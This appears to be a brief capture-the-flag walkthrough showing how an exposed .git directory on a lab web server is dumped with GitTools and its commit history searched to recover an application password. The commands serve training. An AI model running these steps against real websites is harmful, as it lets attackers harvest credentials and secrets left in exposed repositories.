# Can you find the password to the application?

Upon a basic [nmap scan](nmap_results) we find a website is up on port 80 with .git directory which we can exploit with [GitTools](https://github.com/internetwache/GitTools.git).
```
/GitTools/Dumper/gitdumper.sh http://10.10.76.96/.git/ /git
```
this will just download all the files from /.git and save it in .git file which we can see with ```ls -la```.

Now we can just look at all the commit hashes using ```git log```.
We can also see all the contents of the commits.
```
git log | grep commit | cut -d " " -f2 | xargs git show
``` 
Now that we can see all the contents we can just look at the initial commits which contains the password.